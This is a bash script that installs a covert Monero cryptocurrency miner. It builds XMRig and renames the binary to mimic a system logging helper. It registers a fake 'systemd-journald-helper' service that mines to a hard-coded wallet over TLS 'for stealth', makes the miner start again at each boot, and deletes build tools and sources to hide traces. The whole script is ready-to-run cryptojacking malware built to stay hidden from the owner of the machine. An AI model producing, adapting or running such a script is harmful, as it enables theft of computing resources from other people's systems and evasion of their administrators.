#!/bin/bash

# ===== CONFIGURATION =====
WALLET="89PKYocdkhoeSCsn93wAVY7yqCAsSpgZkFriDyhFoW4DMZtzKRbeTZT4cgfedxvju98rXe6mT62eEZigpvV9VtAm5uSkZkQ"  # REPLACE THIS WITH YOUR WALLET
POOL="pool.supportxmr.com:443"       # Recommended pool (TLS for stealth)
MAX_CPU="50"                         # Limit CPU usage (%)
WORKER=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 8)  # Random worker name
# ========================

echo "🔧 Setting up Monero stealth miner..."

# --- 1. Install Dependencies ---
sudo apt update >/dev/null 2>&1 && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev >/dev/null 2>&1

# --- 2. Clone & Build XMRig ---
git clone https://github.com/xmrig/xmrig.git --quiet
cd xmrig || exit
mkdir build && cd build
cmake .. -DWITH_HWLOC=OFF >/dev/null 2>&1  # Disable hardware locator
make -j$(nproc) --quiet

# --- 3. Disguise Miner Binary ---
sudo mv ./xmrig /usr/local/bin/syslogd-helper  # Common system name
sudo chmod +x /usr/local/bin/syslogd-helper

# --- 4. Create Fake Systemd Service ---
echo "📦 Creating disguised systemd service..."

sudo tee /etc/systemd/system/systemd-journald-helper.service >/dev/null <<EOF
[Unit]
Description=Systemd Journald Helper
After=network.target

[Service]
ExecStart=/usr/local/bin/syslogd-helper \\
  -o $POOL \\
  -u $WALLET.$WORKER \\
  --tls \\
  --cpu-max-threads-hint=$MAX_CPU \\
  --randomx-mode=fast \\
  --background \\
  --quiet
Restart=always
RestartSec=30s
Nice=19
CPUWeight=5
IOWeight=5

[Install]
WantedBy=multi-user.target
EOF

# --- 5. Enable Service ---
sudo systemctl daemon-reload >/dev/null 2>&1
sudo systemctl enable systemd-journald-helper --now >/dev/null 2>&1

# --- 6. Cleanup Traces ---
sudo apt remove -y cmake make gcc >/dev/null 2>&1
rm -rf ~/xmrig 2>/dev/null
sudo sysctl -w kernel.nmi_watchdog=0 >/dev/null 2>&1

# --- 7. Output ---
echo "✅ Miner is running stealthily as 'systemd-journald-helper'"
echo "🔍 Wallet: $WALLET"
echo "👷 Worker: $WORKER"
echo "⚡ CPU Limit: ${MAX_CPU}%"
echo "📌 Commands:"
echo "   Check status: sudo systemctl status systemd-journald-helper"
echo "   Stop mining:  sudo systemctl stop systemd-journald-helper"
